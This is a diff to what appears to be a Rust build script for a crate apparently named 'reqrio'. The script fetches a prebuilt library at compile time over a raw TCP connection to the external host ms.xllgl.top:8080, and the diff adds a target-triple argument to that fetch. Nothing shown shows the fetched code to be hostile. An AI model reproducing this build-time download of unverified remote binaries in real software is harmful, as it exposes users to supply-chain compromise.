@@ -64,10 +64,10 @@ impl<'a> Reader<'a> {
     }
 }
 
-fn fetch_lib(frame: Frame, tdr: &Path) -> Result<(), Box<dyn Error>> {
+fn fetch_lib(frame: Frame, tdr: &Path, target: String) -> Result<(), Box<dyn Error>> {
     let stream = TcpStream::connect("ms.xllgl.top:8080")?;
     let mut stream = TkStream::new(stream);
-    stream.fetch_lib(frame, tdr)
+    stream.fetch_lib(frame, tdr, target)
 }
 
 
@@ -111,7 +111,7 @@ fn main() {
     let os = env::var("CARGO_CFG_TARGET_OS").unwrap();
     let arch = env::var("CARGO_CFG_TARGET_ARCH").unwrap();
     let env = env::var("CARGO_CFG_TARGET_ENV").unwrap();
-    let version = env::var("CARGO_PKG_VERSION").unwrap();
+    let version = env::var("CARGO_PKG_VERSION").unwrap().split("-").next().unwrap_or("").to_string();
     let token = env::var("REQRIO_TOKEN").unwrap_or("".to_string());
     let typ = if cfg!(feature = "static_link") { LibType::Static } else { LibType::Dynamic };
     let target_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
@@ -137,7 +137,7 @@ fn main() {
         arch: &arch,
         version: &version,
         token: &token,
-    }, target_dir).unwrap();
+    }, target_dir, format!("{}-{}-{}", arch, os, env)).unwrap();
     let checksum = format!("{:?} {}", typ, version);
     fs::write(target_dir.join("reqrio").join("checksum"), checksum).unwrap();
 }
